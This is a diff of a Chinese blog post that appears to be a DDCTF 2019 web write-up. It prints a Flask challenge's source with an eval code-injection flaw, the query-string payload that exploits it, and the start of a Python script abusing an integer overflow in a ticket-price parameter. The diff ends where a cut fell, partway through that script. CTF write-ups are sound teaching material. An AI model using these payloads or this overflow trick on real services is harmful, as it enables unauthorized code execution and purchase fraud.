@@ -46,7 +46,7 @@
     "articleSection" : "posts",
     "name" : "DDCTF2019 Web 填坑",
     "headline" : "DDCTF2019 Web 填坑",
-    "description" : "前言 DDCTF 2019 Web，特地记录一下当时没做的或者好玩的题目 homebrew event loop http:\/\/116.85.48.107:5002\/d5af33f66147e857 源码审计： # -*- encoding: utf-8 -*- # written in python 2.7 __author__ = \x27garzon\x27 from flask import Flask, session, request, Response import urllib app = Flask(__name__) app.secret_key = \x27*********************\x27 # censored url_prefix = \x27\/d5af33f66147e857\x27 def FLAG():",
+    "description" : "前言 DDCTF 2019 Web，特地记录一下当时没做的或者好玩的题目 homebrew event loop http:\/\/116.85.48.107:5002\/d5af33f66147e857 源码审计： # -*- encoding: utf-8 -*- # written in python 2.7 __author__ = \x26#39;garzon\x26#39; from flask import Flask, session, request, Response import urllib app = Flask(__name__) app.secret_key = \x26#39;*********************\x26#39; # censored url_prefix = \x26#39;\/d5af33f66147e857\x26#39; def FLAG():",
     "inLanguage" : "zh-cn",
     "author" : "syang",
     "creator" : "syang",
@@ -57,7 +57,7 @@
     "datePublished": "2019-04-25 19:29:23 \x2b0000 UTC",
     "dateModified" : "2019-04-25 19:29:23 \x2b0000 UTC",
     "url" : "https:\/\/syang-ng.github.io\/2019\/04\/ddctf2019-web\/",
-    "wordCount" : "2219",
+    "wordCount" : "2211",
     "keywords" : [  "syang\x27s blog"]
 }
 </script>
@@ -145,278 +145,252 @@
           
           
 
-          
-
-<h2 id="前言">前言</h2>
-
+          <h2 id="前言">前言</h2>
 <p>DDCTF 2019 Web，特地记录一下当时没做的或者好玩的题目</p>
-
 <h2 id="homebrew-event-loop">homebrew event loop</h2>
-
-<p><a href="http://116.85.48.107:5002/d5af33f66147e857" rel="nofollow noreferrer" target="_blank">http://116.85.48.107:5002/d5af33f66147e857</a></p>
-
+<p>http://116.85.48.107:5002/d5af33f66147e857</p>
 <p>源码审计：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># -*- encoding: utf-8 -*- </span>
+<span style="color:#75715e"># written in python 2.7 </span>
+__author__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;garzon&#39;</span> 
 
-<pre><code class="language-python"># -*- encoding: utf-8 -*- 
-# written in python 2.7 
-__author__ = 'garzon' 
+<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, session, request, Response 
+<span style="color:#f92672">import</span> urllib 
 
-from flask import Flask, session, request, Response 
-import urllib 
+app <span style="color:#f92672">=</span> Flask(__name__) 
+app<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;*********************&#39;</span> <span style="color:#75715e"># censored </span>
+url_prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/d5af33f66147e857&#39;</span> 
 
-app = Flask(__name__) 
-app.secret_key = '*********************' # censored 
-url_prefix = '/d5af33f66147e857' 
-
-def FLAG(): 
-    return 'FLAG_is_here_but_i_wont_show_you'  # censored 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">FLAG</span>(): 
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;FLAG_is_here_but_i_wont_show_you&#39;</span>  <span style="color:#75715e"># censored </span>
      
-def trigger_event(event): 
-    session['log'].append(event) 
-    if len(session['log']) &gt; 5: session['log'] = session['log'][-5:] 
-    if type(event) == type([]): 
-        request.event_queue += event 
-    else: 
-        request.event_queue.append(event) 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trigger_event</span>(event): 
+    session[<span style="color:#e6db74">&#39;log&#39;</span>]<span style="color:#f92672">.</span>append(event) 
+    <span style="color:#66d9ef">if</span> len(session[<span style="color:#e6db74">&#39;log&#39;</span>]) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5</span>: session[<span style="color:#e6db74">&#39;log&#39;</span>] <span style="color:#f92672">=</span> session[<span style="color:#e6db74">&#39;log&#39;</span>][<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>:] 
+    <span style="color:#66d9ef">if</span> type(event) <span style="color:#f92672">==</span> type([]): 
+        request<span style="color:#f92672">.</span>event_queue <span style="color:#f92672">+=</span> event 
+    <span style="color:#66d9ef">else</span>: 
+        request<span style="color:#f92672">.</span>event_queue<span style="color:#f92672">.</span>append(event) 
 
-def get_mid_str(haystack, prefix, postfix=None): 
-    haystack = haystack[haystack.find(prefix)+len(prefix):] 
-    if postfix is not None: 
-        haystack = haystack[:haystack.find(postfix)] 
-    return haystack 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_mid_str</span>(haystack, prefix, postfix<span style="color:#f92672">=</span>None): 
+    haystack <span style="color:#f92672">=</span> haystack[haystack<span style="color:#f92672">.</span>find(prefix)<span style="color:#f92672">+</span>len(prefix):] 
+    <span style="color:#66d9ef">if</span> postfix <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> None: 
+        haystack <span style="color:#f92672">=</span> haystack[:haystack<span style="color:#f92672">.</span>find(postfix)] 
+    <span style="color:#66d9ef">return</span> haystack 
      
-class RollBackException: pass 
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RollBackException</span>: <span style="color:#66d9ef">pass</span> 
 
-def execute_event_loop(): 
-    valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') 
-    resp = None 
-    while len(request.event_queue) &gt; 0: 
-        event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot; 
-        request.event_queue = request.event_queue[1:] 
-        if not event.startswith(('action:', 'func:')): continue 
-        for c in event: 
-            if c not in valid_event_chars: break 
-        else: 
-            is_action = event[0] == 'a' 
-            action = get_mid_str(event, ':', ';') 
-            args = get_mid_str(event, action+';').split('#') 
-            try: 
-                event_handler = eval(action + ('_handler' if is_action else '_function')) 
-                ret_val = event_handler(args) 
-            except RollBackException: 
-                if resp is None: resp = '' 
-                resp += 'ERROR! All transactions have been cancelled. &lt;br /&gt;' 
-                resp += '&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' 
-                session['num_items'] = request.prev_session['num_items'] 
-                session['points'] = request.prev_session['points'] 
-                break 
-            except Exception, e: 
-                if resp is None: resp = '' 
-                #resp += str(e) # only for debugging 
-                continue 
-            if ret_val is not None: 
-                if resp is None: resp = ret_val 
-                else: resp += ret_val 
-    if resp is None or resp == '': resp = ('404 NOT FOUND', 404) 
-    session.modified = True 
-    return resp 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execute_event_loop</span>(): 
+    valid_event_chars <span style="color:#f92672">=</span> set(<span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;</span>) 
+    resp <span style="color:#f92672">=</span> None 
+    <span style="color:#66d9ef">while</span> len(request<span style="color:#f92672">.</span>event_queue) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>: 
+        event <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>event_queue[<span style="color:#ae81ff">0</span>] <span style="color:#75715e"># `event` is something like &#34;action:ACTION;ARGS0#ARGS1#ARGS2......&#34; </span>
+        request<span style="color:#f92672">.</span>event_queue <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>event_queue[<span style="color:#ae81ff">1</span>:] 
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> event<span style="color:#f92672">.</span>startswith((<span style="color:#e6db74">&#39;action:&#39;</span>, <span style="color:#e6db74">&#39;func:&#39;</span>)): <span style="color:#66d9ef">continue</span> 
+        <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> event: 
+            <span style="color:#66d9ef">if</span> c <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> valid_event_chars: <span style="color:#66d9ef">break</span> 
+        <span style="color:#66d9ef">else</span>: 
+            is_action <span style="color:#f92672">=</span> event[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;a&#39;</span> 
+            action <span style="color:#f92672">=</span> get_mid_str(event, <span style="color:#e6db74">&#39;:&#39;</span>, <span style="color:#e6db74">&#39;;&#39;</span>) 
+            args <span style="color:#f92672">=</span> get_mid_str(event, action<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;;&#39;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;#&#39;</span>) 
+            <span style="color:#66d9ef">try</span>: 
+                event_handler <span style="color:#f92672">=</span> eval(action <span style="color:#f92672">+</span> (<span style="color:#e6db74">&#39;_handler&#39;</span> <span style="color:#66d9ef">if</span> is_action <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;_function&#39;</span>)) 
+                ret_val <span style="color:#f92672">=</span> event_handler(args) 
+            <span style="color:#66d9ef">except</span> RollBackException: 
+                <span style="color:#66d9ef">if</span> resp <span style="color:#f92672">is</span> None: resp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> 
+                resp <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;ERROR! All transactions have been cancelled. &lt;br /&gt;&#39;</span> 
+                resp <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:view;index&#34;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;</span> 
+                session[<span style="color:#e6db74">&#39;num_items&#39;</span>] <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>prev_session[<span style="color:#e6db74">&#39;num_items&#39;</span>] 
+                session[<span style="color:#e6db74">&#39;points&#39;</span>] <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>prev_session[<span style="color:#e6db74">&#39;points&#39;</span>] 
+                <span style="color:#66d9ef">break</span> 
+            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>, e: 
+                <span style="color:#66d9ef">if</span> resp <span style="color:#f92672">is</span> None: resp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> 
+                <span style="color:#75715e">#resp += str(e) # only for debugging </span>
+                <span style="color:#66d9ef">continue</span> 
+            <span style="color:#66d9ef">if</span> ret_val <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> None: 
+                <span style="color:#66d9ef">if</span> resp <span style="color:#f92672">is</span> None: resp <span style="color:#f92672">=</span> ret_val 
+                <span style="color:#66d9ef">else</span>: resp <span style="color:#f92672">+=</span> ret_val 
+    <span style="color:#66d9ef">if</span> resp <span style="color:#f92672">is</span> None <span style="color:#f92672">or</span> resp <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span>: resp <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;404 NOT FOUND&#39;</span>, <span style="color:#ae81ff">404</span>) 
+    session<span style="color:#f92672">.</span>modified <span style="color:#f92672">=</span> True 
+    <span style="color:#66d9ef">return</span> resp 
      
-@app.route(url_prefix+'/') 
-def entry_point(): 
-    querystring = urllib.unquote(request.query_string) 
-    request.event_queue = [] 
-    if querystring == '' or (not querystring.startswith('action:')) or len(querystring) &gt; 100: 
-        querystring = 'action:index;False#False' 
-    if 'num_items' not in session: 
-        session['num_items'] = 0 
-        session['points'] = 3 
-        session['log'] = [] 
-    request.prev_session = dict(session) 
+<span style="color:#a6e22e">@app.route</span>(url_prefix<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/&#39;</span>) 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">entry_point</span>(): 
+    querystring <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>unquote(request<span style="color:#f92672">.</span>query_string) 
+    request<span style="color:#f92672">.</span>event_queue <span style="color:#f92672">=</span> [] 
+    <span style="color:#66d9ef">if</span> querystring <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">or</span> (<span style="color:#f92672">not</span> querystring<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;action:&#39;</span>)) <span style="color:#f92672">or</span> len(querystring) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span>: 
+        querystring <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;action:index;False#False&#39;</span> 
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;num_items&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> session: 
+        session[<span style="color:#e6db74">&#39;num_items&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> 
+        session[<span style="color:#e6db74">&#39;points&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span> 
+        session[<span style="color:#e6db74">&#39;log&#39;</span>] <span style="color:#f92672">=</span> [] 
+    request<span style="color:#f92672">.</span>prev_session <span style="color:#f92672">=</span> dict(session) 
     trigger_event(querystring) 
-    return execute_event_loop() 
+    <span style="color:#66d9ef">return</span> execute_event_loop() 
 
-# handlers/functions below -------------------------------------- 
+<span style="color:#75715e"># handlers/functions below -------------------------------------- </span>
 
-def view_handler(args): 
-    page = args[0] 
-    html = '' 
-    html += '[INFO] you have {} diamonds, {} points now.&lt;br /&gt;'.format(session['num_items'], session['points']) 
-    if page == 'index': 
-        html += '&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;' 
-        html += '&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;' 
-        html += '&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;' 
-    elif page == 'shop': 
-        html += '&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;' 
-    elif page == 'reset': 
-        del session['num_items'] 
-        html += 'Session reset.&lt;br /&gt;' 
-    html += '&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' 
-    return html 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view_handler</span>(args): 
+    page <span style="color:#f92672">=</span> args[<span style="color:#ae81ff">0</span>] 
+    html <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> 
+    html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&#39;</span><span style="color:#f92672">.</span>format(session[<span style="color:#e6db74">&#39;num_items&#39;</span>], session[<span style="color:#e6db74">&#39;points&#39;</span>]) 
+    <span style="color:#66d9ef">if</span> page <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;index&#39;</span>: 
+        html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:index;True</span><span style="color:#e6db74">%23F</span><span style="color:#e6db74">alse&#34;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#39;</span> 
+        html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:view;shop&#34;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#39;</span> 
+        html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:view;reset&#34;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#39;</span> 
+    <span style="color:#66d9ef">elif</span> page <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;shop&#39;</span>: 
+        html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:buy;1&#34;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#39;</span> 
+    <span style="color:#66d9ef">elif</span> page <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;reset&#39;</span>: 
+        <span style="color:#66d9ef">del</span> session[<span style="color:#e6db74">&#39;num_items&#39;</span>] 
+        html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Session reset.&lt;br /&gt;&#39;</span> 
+    html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:view;index&#34;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;</span> 
+    <span style="color:#66d9ef">return</span> html 
 
-def index_handler(args): 
-    bool_show_source = str(args[0]) 
-    bool_download_source = str(args[1]) 
-    if bool_show_source == 'True': 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index_handler</span>(args): 
+    bool_show_source <span style="color:#f92672">=</span> str(args[<span style="color:#ae81ff">0</span>]) 
+    bool_download_source <span style="color:#f92672">=</span> str(args[<span style="color:#ae81ff">1</span>]) 
+    <span style="color:#66d9ef">if</span> bool_show_source <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;True&#39;</span>: 
      
-        source = open('eventLoop.py', 'r') 
-        html = '' 
-        if bool_download_source != 'True': 
-            html += '&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;' 
-            html += '&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' 
+        source <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;eventLoop.py&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) 
+        html <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> 
+        <span style="color:#66d9ef">if</span> bool_download_source <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;True&#39;</span>: 
+            html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:index;True%23True&#34;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#39;</span> 
+            html <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;./?action:view;index&#34;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;</span> 
              
-        for line in source: 
-            if bool_download_source != 'True': 
-                html += line.replace('&amp;','&amp;amp;').replace('\t', '&amp;nbsp;'*4).replace(' ','&amp;nbsp;').replace('&lt;', '&amp;lt;').replace('&gt;','&amp;gt;').replace('\n', '&lt;br /&gt;') 
-            else: 
-                html += line 
-        source.close() 
+        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> source: 
+            <span style="color:#66d9ef">if</span> bool_download_source <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;True&#39;</span>: 
+                html <span style="color:#f92672">+=</span> line<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&amp;&#39;</span>,<span style="color:#e6db74">&#39;&amp;amp;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&amp;nbsp;&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39; &#39;</span>,<span style="color:#e6db74">&#39;&amp;nbsp;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&lt;&#39;</span>, <span style="color:#e6db74">&#39;&amp;lt;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">&#39;&amp;gt;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&lt;br /&gt;&#39;</span>) 
+            <span style="color:#66d9ef">else</span>: 
+                html <span style="color:#f92672">+=</span> line 
+        source<span style="color:#f92672">.</span>close() 
          
-        if bool_download_source == 'True': 
-            headers = {} 
-            headers['Content-Type'] = 'text/plain' 
-            headers['Content-Disposition'] = 'attachment; filename=serve.py' 
-            return Response(html, headers=headers) 
-        else: 
-            return html 
-    else: 
-        trigger_event('action:view;index') 
+        <span style="color:#66d9ef">if</span> bool_download_source <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;True&#39;</span>: 
+            headers <span style="color:#f92672">=</span> {} 
+            headers[<span style="color:#e6db74">&#39;Content-Type&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;text/plain&#39;</span> 
+            headers[<span style="color:#e6db74">&#39;Content-Disposition&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;attachment; filename=serve.py&#39;</span> 
+            <span style="color:#66d9ef">return</span> Response(html, headers<span style="color:#f92672">=</span>headers) 
+        <span style="color:#66d9ef">else</span>: 
+            <span style="color:#66d9ef">return</span> html 
+    <span style="color:#66d9ef">else</span>: 
+        trigger_event(<span style="color:#e6db74">&#39;action:view;index&#39;</span>) 
          
-def buy_handler(args): 
-    num_items = int(args[0]) 
-    if num_items &lt;= 0: return 'invalid number({}) of diamonds to buy&lt;br /&gt;'.format(args[0]) 
-    session['num_items'] += num_items  
-    trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index']) 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">buy_handler</span>(args): 
+    num_items <span style="color:#f92672">=</span> int(args[<span style="color:#ae81ff">0</span>]) 
+    <span style="color:#66d9ef">if</span> num_items <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>: <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;</span><span style="color:#f92672">.</span>format(args[<span style="color:#ae81ff">0</span>]) 
+    session[<span style="color:#e6db74">&#39;num_items&#39;</span>] <span style="color:#f92672">+=</span> num_items  
+    trigger_event([<span style="color:#e6db74">&#39;func:consume_point;{}&#39;</span><span style="color:#f92672">.</span>format(num_items), <span style="color:#e6db74">&#39;action:view;index&#39;</span>]) 
      
-def consume_point_function(args): 
-    point_to_consume = int(args[0]) 
-    if session['points'] &lt; point_to_consume: raise RollBackException() 
-    session['points'] -= point_to_consume 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">consume_point_function</span>(args): 
+    point_to_consume <span style="color:#f92672">=</span> int(args[<span style="color:#ae81ff">0</span>]) 
+    <span style="color:#66d9ef">if</span> session[<span style="color:#e6db74">&#39;points&#39;</span>] <span style="color:#f92672">&lt;</span> point_to_consume: <span style="color:#66d9ef">raise</span> RollBackException() 
+    session[<span style="color:#e6db74">&#39;points&#39;</span>] <span style="color:#f92672">-=</span> point_to_consume 
      
-def show_flag_function(args): 
-    flag = args[0] 
-    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. 
-    return 'You naughty boy! ;) &lt;br /&gt;' 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_flag_function</span>(args): 
+    flag <span style="color:#f92672">=</span> args[<span style="color:#ae81ff">0</span>] 
+    <span style="color:#75715e">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. </span>
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;You naughty boy! ;) &lt;br /&gt;&#39;</span> 
      
-def get_flag_handler(args): 
-    if session['num_items'] &gt;= 5: 
-        trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries 
-    trigger_event('action:view;index') 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_flag_handler</span>(args): 
+    <span style="color:#66d9ef">if</span> session[<span style="color:#e6db74">&#39;num_items&#39;</span>] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">5</span>: 
+        trigger_event(<span style="color:#e6db74">&#39;func:show_flag;&#39;</span> <span style="color:#f92672">+</span> FLAG()) <span style="color:#75715e"># show_flag_function has been disabled, no worries </span>
+    trigger_event(<span style="color:#e6db74">&#39;action:view;index&#39;</span>) 
      
-if __name__ == '__main__': 
-    app.run(debug=False, host='0.0.0.0') 
-</code></pre>
-
-<p>很明显 <code>event_handler = eval(action + ('_handler' if is_action else '_function'))</code> 处有明显漏洞，由于我们可以控制 <code>action</code> 参数，所以可以在参数最后拼接 <code>#</code> 注释代码进而代码执行。</p>
-
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>: 
+    app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span>False, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>) 
+</code></pre></div><p>很明显 <code>event_handler = eval(action + ('_handler' if is_action else '_function'))</code> 处有明显漏洞，由于我们可以控制 <code>action</code> 参数，所以可以在参数最后拼接 <code>#</code> 注释代码进而代码执行。</p>
 <p>最终 payload 如下：</p>
-
 <pre><code>116.85.48.107:5002/d5af33f66147e857/?action:trigger_event%23;action:buy;1%23action:buy;3%23action:get_flag;
-</code></pre>
-
-<p>虽然 <code>get_flag</code> 没有回显，但由于程序会将相应的结果写入 <code>session['log']</code>，所以可以通过解密 session 的方式获得 flag，对应的解密脚本地址：<a href="https://github.com/noraj/flask-session-cookie-manager" rel="nofollow noreferrer" target="_blank">https://github.com/noraj/flask-session-cookie-manager</a></p>
-
-<h2 id="大吉大利-今晚吃鸡">大吉大利，今晚吃鸡</h2>
-
+</code></pre><p>虽然 <code>get_flag</code> 没有回显，但由于程序会将相应的结果写入 <code>session['log']</code>，所以可以通过解密 session 的方式获得 flag，对应的解密脚本地址：https://github.com/noraj/flask-session-cookie-manager</p>
+<h2 id="大吉大利今晚吃鸡">大吉大利，今晚吃鸡</h2>
 <p>Go 语言的整数溢出问题，最后需要编写脚本</p>
-
 <p>问题在于 <code>http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=2000</code> 的 <code>ticket_price</code> 可控，而当我们设置 <code>ticket_price</code> 为 <code>2**32</code> 时，可以发现购买成功。很明显后端在处理购买逻辑时将我们输入的价格作为有符号数进行处理，进而触发整数溢出问题（这里卡了很久，一直以为是 uint64 最后发现竟然是 uint32，批判一下自己，单纯懒得尝试就弃好久</p>
-
 <p>最后写脚本，真·我杀我自己：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json
+<span style="color:#f92672">import</span> requests
 
-<pre><code class="language-python">import json
-import requests
+basename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;aabbcc&#39;</span>
+baseUrl <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://117.51.147.155:5050/ctf/api/&#39;</span>
 
-basename = 'aabbcc'
-baseUrl = 'http://117.51.147.155:5050/ctf/api/'
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register</span>(s, q):
+    <span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span>get(baseUrl<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;register&#39;</span>, params<span style="color:#f92672">=</span>q)
 
-def register(s, q):
-    return s.get(baseUrl+'register', params=q)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>(s, q):
+    <span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span>get(baseUrl<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;login&#39;</span>, params<span style="color:#f92672">=</span>q)
 
-def login(s, q):
-    return s.get(baseUrl+'login', params=q)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">buy_ticket</span>(s):
+    res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(baseUrl<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;buy_ticket&#39;</span>, params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;ticket_price&#34;</span>: <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span><span style="color:#ae81ff">32</span>})
+    res <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(res<span style="color:#f92672">.</span>text)
+    <span style="color:#66d9ef">return</span> res[<span style="color:#e6db74">&#39;data&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;bill_id&#39;</span>]
 
-def buy_ticket(s):
-    res = s.get(baseUrl+'buy_ticket', params={&quot;ticket_price&quot;: 2**32})
-    res = json.loads(res.text)
-    return res['data'][0]['bill_id']
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pay_ticket</span>(s, bill_id):
+    res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(baseUrl<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;pay_ticket&#39;</span>, params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;bill_id&#39;</span>: bill_id})
+    res <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(res<span style="color:#f92672">.</span>text)
+    <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;id&#39;</span>: res[<span style="color:#e6db74">&#39;data&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;your_id&#39;</span>], <span style="color:#e6db74">&#39;ticket&#39;</span>: res[<span style="color:#e6db74">&#39;data&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;your_ticket&#39;</span>]}
 
-def pay_ticket(s, bill_id):
-    res = s.get(baseUrl+'pay_ticket', params={'bill_id': bill_id})
-    res = json.loads(res.text)
-    return {'id': res['data'][0]['your_id'], 'ticket': res['data'][0]['your_ticket']}
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove_robot</span>(s, p):
+    <span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span>get(baseUrl<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;remove_robot&#39;</span>, params<span style="color:#f92672">=</span>p)
 
-def remove_robot(s, p):
-    return s.get(baseUrl+'remove_robot', params=p)
